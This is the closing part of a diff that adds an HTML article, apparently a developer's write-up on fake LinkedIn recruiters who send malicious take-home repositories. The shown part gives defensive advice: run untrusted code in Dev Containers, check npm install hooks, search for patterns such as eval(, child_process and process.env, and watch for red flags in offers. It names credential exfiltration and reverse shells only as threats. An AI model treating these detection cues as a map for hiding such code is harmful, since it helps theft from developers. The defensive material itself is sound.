+    </p>
+  </section>
+
+  <!-- ==================== PROTECT YOURSELF ==================== -->
+  <section>
+    <div class="section-label">Defense</div>
+    <h2>How to protect yourself</h2>
+
+    <div class="callout callout-green" style="margin-bottom: 32px; border-width: 2px;">
+      <h3>⬡ The #1 rule: use Dev Containers</h3>
+      <p style="margin-bottom: 16px;">
+        If you ever need to run code you didn't write — whether it's a take-home assessment, an open-source project, or a repo someone sent you on LinkedIn — <strong>never run it directly on your host machine.</strong> Use <strong>Dev Containers</strong> (VS Code's built-in feature, or any Docker-based isolated environment).
+      </p>
+      <p style="margin-bottom: 16px;">
+        A dev container runs the code inside a sandboxed Docker container that is <strong>completely isolated from your local filesystem, environment variables, SSH keys, browser wallets, and everything else on your machine.</strong> Even if the repo contains a full RCE payload like the one I found, the attacker gains access to nothing — just an empty, disposable container that you can destroy when you're done.
+      </p>
+      <p style="margin-bottom: 16px;">Here's what a dev container protects you from:</p>
+      <ul>
+        <li><code>process.env</code> exfiltration — the container has its own isolated environment, your real secrets are never exposed</li>
+        <li>Filesystem access — your wallet files, SSH keys, <code>~/.aws</code> credentials, browser data, and personal files are all invisible to the container</li>
+        <li>Reverse shells — even if the attacker opens a shell, they're inside a throwaway container with no access to your network or host</li>
+        <li>npm lifecycle attacks — <code>preinstall</code>, <code>postinstall</code>, and <code>prepare</code> scripts run inside the sandbox, not on your machine</li>
+      </ul>
+      <p style="margin-top: 16px;">
+        <strong>Getting started is simple:</strong> install the "Dev Containers" extension in VS Code, add a <code>.devcontainer/devcontainer.json</code> to any project (or let VS Code generate one), and reopen the folder in a container. Every <code>npm install</code>, every <code>node</code> process, every script runs inside the sandbox. It takes two minutes to set up and it could save you from a catastrophic breach.
+      </p>
+      <p style="margin-top: 12px;">
+        <strong>This should be standard practice for every developer</strong> — not just when reviewing suspicious code, but as a default workflow. If the code is safe, you lose nothing. If it's malicious, you lose nothing either.
+      </p>
+    </div>
+
+    <div class="callout callout-green">
+      <h3>Before you even clone anything</h3>
+      <ul>
+        <li>Browse the repository on GitHub first — read the code in your browser before it touches your machine</li>
+        <li>Check <code>package.json</code> for <code>preinstall</code>, <code>postinstall</code>, and <code>prepare</code> scripts — these run automatically on <code>npm install</code></li>
+        <li>Look for suspicious dependencies — built-in Node modules like <code>fs</code> or <code>path</code> should never appear as npm packages</li>
+        <li>Search for <code>Buffer.from</code>, <code>eval(</code>, <code>Function(</code>, <code>child_process</code>, and <code>process.env</code> across the entire codebase</li>
+        <li>Verify the author's identity — disposable email addresses (GMX, Guerrilla Mail, Temp Mail) in git history are a red flag</li>
+        <li>If you decide to run it, <strong>always use a dev container</strong> — never run untrusted code on your host machine</li>
+      </ul>
+    </div>
+
+    <div class="callout callout-warning">
+      <h3>Red flags in the "offer"</h3>
+      <ul>
+        <li>Unsolicited connection requests from profiles with few mutual connections</li>
+        <li>Offers that feel too good — inflated salaries, immediate start, aggressive timelines</li>
+        <li>Pressure to "clone and run" a repo as part of the evaluation process</li>
+        <li>The company's online presence is thin — recently created website, no press coverage, no verifiable team</li>
+        <li>Reluctance to do a video call before the technical assessment</li>
+        <li>Messages or profiles that disappear after you don't comply</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- ==================== CALL TO ACTION ==================== -->
+  <section>
+    <div class="section-label">Call to Action</div>
+    <h2>To LinkedIn: this needs to stop</h2>
+    <p>
+      This attack vector has been active for years. I've personally encountered it at least <strong>6–8 times since 2022</strong>. Each time, the attacker's profile is eventually removed — but only after the damage is done or attempted. The pattern is well-documented in the cybersecurity community, yet it continues to thrive.
+    </p>
+    <p>
+      <strong>LinkedIn needs better mechanisms to detect and prevent recruitment-based social engineering attacks.</strong> Profile verification, reporting workflows that actually lead to action, and proactive detection of profiles that follow known attack patterns. The professional trust that makes LinkedIn valuable is the same trust that makes it exploitable.
+    </p>
+
+    <blockquote>
+      The best defense is a healthy dose of skepticism, the discipline to read code before running it, and a dev container between you and everything you didn't write. If an offer sounds too good to be true, it probably isn't an offer at all.
+    </blockquote>
+  </section>
+
+  <!-- ==================== FOOTER ==================== -->
+  <footer class="article-footer">
+    <p>
+      If this has happened to you, share your story. The more visible these attacks become, the harder they are to execute. Stay vigilant.
+    </p>
+    <div class="hashtags">
+      #CyberSecurity #LinkedIn #Phishing #DeFi #Web3Security #CryptoSecurity #SocialEngineering #InfoSec #DeveloperSecurity #Blockchain #WalletSecurity #DevContainers
+    </div>
+  </footer>
+</div>
+
+</body>
+</html>
